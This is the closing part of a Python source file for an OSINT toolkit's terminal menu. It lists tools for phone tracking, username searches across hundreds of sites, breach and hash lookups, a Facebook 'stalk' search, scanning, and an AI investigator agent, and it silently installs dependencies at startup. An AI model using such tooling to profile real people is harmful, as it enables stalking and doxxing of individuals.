            ,·'        #   )          ,,              ',  ,'
             '  ' ` ¯,'  ´ `' ´    , -,' ,'               \/
                    '·,, ., ~, '· `   ,/                 |
                      '· ·' ' '`    , ·'                   |
                 , ·,' , , , . · '                         |
                '· ,               , · '  ~ ,              \
                   '·,      , ·`             '\              '\
                      '  '                   0xk™
"""

BANNER_IMAGES = [BANNER_0XK, BANNER_DUMMAZZ, BANNER_NESS, BANNER_POPEYE]

def run_banner():
    clear()
    selected = random.choice(BANNER_IMAGES)
    print(f"\n{R}{selected}{RS}")
    print(f"\n{C}sbsecrybt youtube {R}https://www.youtube.com/@0xk-j7z{RS}\n")

def showMenu():
    options = [
        {'num': 1, 'text': 'IP Tracker', 'func': IP_Track},
        {'num': 34, 'text': 'Masscan Engine (Advanced IP Scan)', 'func': masscan_ip_engine},
        {'num': 2, 'text': 'Phone Number Tracker', 'func': phoneGW},
        {'num': 3, 'text': 'PhoneTracker Pro Ultra', 'func': phoneGW_Ultra},
        {'num': 4, 'text': 'TeleSpotter Multi-Search', 'func': teleSearch_engine},
        {'num': 5, 'text': 'Username Tracker (Quick/Deep/Both)', 'func': TrackLu},
        {'num': 6, 'text': 'Username Tracker (350+ Sites)', 'func': TrackLu_Super},
        {'num': 7, 'text': 'Email OSINT', 'func': email_osint},
        {'num': 8, 'text': 'Domain OSINT', 'func': domain_osint},
        {'num': 9, 'text': 'Metadata Extractor (Advanced)', 'func': metadata_extractor},
        {'num': 10, 'text': 'Pastebin Search', 'func': pastebin_osint},
        {'num': 11, 'text': 'GitHub Code Search', 'func': github_osint},
        {'num': 12, 'text': 'Reverse Image Search (8 Engines)', 'func': reverse_image},
        {'num': 13, 'text': 'Show My IP', 'func': showIP},
        {'num': 14, 'text': 'Website Downloader', 'func': website_downloader},
        {'num': 15, 'text': 'Stealth Browser', 'func': stealth_browser_menu},
        {'num': 16, 'text': 'DeHashed Breach Search', 'func': dehashed_menu},
        {'num': 17, 'text': 'Dark Web OSINT', 'func': darkweb_menu},
        {'num': 18, 'text': 'Google Dorks Builder', 'func': dork_builder_menu},
        {'num': 19, 'text': 'Reputation Engine (0-100)', 'func': reputation_engine_menu},
        {'num': 20, 'text': 'Agentic AI Investigation', 'func': agentic_investigation},
        {'num': 21, 'text': 'SMOS Smart OSINT', 'func': smart_osint},
        {'num': 22, 'text': 'AI Correlation Engine (Groq)', 'func': ai_correlation_engine},
        {'num': 23, 'text': 'Visualization Graph', 'func': visualization_menu},
        {'num': 24, 'text': 'Age/Gender Detection', 'func': age_gender_menu},
        {'num': 25, 'text': 'DeepDive (6-Phase Auto-Investigation)', 'func': deepdive_menu},
        {'num': 26, 'text': 'Free SMS Reception', 'func': receive_sms_menu},
        {'num': 27, 'text': 'Hash Decryption (lea.kz)', 'func': hash_decrypt_menu},
        {'num': 28, 'text': 'Instagram OSINT (JSON)', 'func': instagram_osint_menu},
        {'num': 29, 'text': 'Twitter OSINT (JSON)', 'func': twitter_osint_menu},
        {'num': 30, 'text': 'Facebook GraphSearch (35x)', 'func': facebook_stalk_menu},
        {'num': 31, 'text': 'French Directory (PagesJaunes)', 'func': pages_jaunes_search},
        {'num': 32, 'text': 'Email Header Analyzer', 'func': email_header_analyze},
        {'num': 33, 'text': 'Setup: API Keys & Config', 'func': settings_menu},
        {'num': 35, 'text': 'DNSRecon Engine (Advanced DNS Enum)', 'func': dnsrecon_menu},
        {'num': 36, 'text': 'AI Autonomous Investigator (Agent)', 'func': ai_agent_engine},
        {'num': 37, 'text': 'Advanced Security & OSINT Modules', 'func': advanced_tools_menu},
        {'num': 0, 'text': 'Exit', 'func': exit},
    ]
    
    clear()
    run_banner()
    
    print(f"\n{Wh}")
    print(f"{Wh}{C}            AVAILABLE TOOLS              {Wh}")
    print(f"{Wh}")
    for opt in options:
        print(f"{Wh}  {R}[{Gr}{opt['num']:2}{R}]{Wh}  {opt['text']:<30}")
    print(f"{Wh}{RS}")
    
    return options

def main():
    try:
        while True:
            options = showMenu()
            try:
                choice = int(input(f"\n{Wh}[{R}?{Wh}] {R}Select option {Wh}[0-{len(options)-1}]{Wh}: {Gr}"))
                
                if choice == 0:
                    print(f"\n{R}[+] Anonymous never dies! We'll be back!{Wh}")
                    time.sleep(1)
                    sys.exit(0)
                
                found = False
                for option in options:
                    if option['num'] == choice:
                        option['func']()
                        found = True
                        break
                
                if not found:
                    print(f"{R}[!] Invalid option!")
                    time.sleep(1)
                    
            except ValueError:
                print(f"{R}[!] Please enter a valid number!")
                time.sleep(1)
                
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!] Exiting gracefully...{RS}")
        sys.exit(0)

if __name__ == "__main__":
    # Auto-install missing dependencies silently at startup
    _auto_install_all(silent=True)
    main()

